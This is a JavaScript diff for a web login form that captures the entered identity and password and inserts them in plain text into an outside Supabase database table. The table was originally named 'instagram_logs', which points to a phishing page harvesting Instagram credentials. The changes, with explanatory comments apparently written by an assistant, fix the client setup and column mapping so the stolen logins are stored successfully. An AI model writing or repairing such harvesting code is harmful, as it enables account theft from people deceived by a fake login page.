@@ -2,23 +2,27 @@ const SUPABASE_URL = "https://vhkxrhuygujrghgjikdu.supabase.co";
 const SUPABASE_ANON_KEY = "sb_publishable_NaZ5L8e0wq_hzQ8WNCk_cQ_zMPI5FB-";
 
 const authForm = document.getElementById('login-form');
-const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
-// Add the 'async' keyword right before the (e) => arrow function
+// Using window.supabase ensures the client initializes correctly without variable conflicts
+const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
 authForm.addEventListener('submit', async (e) => {
     e.preventDefault();
     
     const userIdentity = document.getElementById('identity-input').value; 
     const userPassword = document.getElementById('password-input').value;
 
-    // Now 'await' is completely valid here because the outer function is 'async'!
     const { data, error } = await supabase
-      .from('instagram_logs') 
+      .from('user_logs') // 1. Matches your table name exactly
       .insert([
         { 
-          user_identity: userIdentity, 
-          password: userPassword       
+          email: userIdentity, // 2. Maps the input value to your database 'email' column
+          password: userPassword // 3. Maps the input value to your database 'password' column      
         }
       ]);
 
-    // Rest of your handling code...
+    if (error) {
+        console.error("Database Error:", error.message);
+    } else {
+        console.log("Success! Data sent.");
+    }
 });
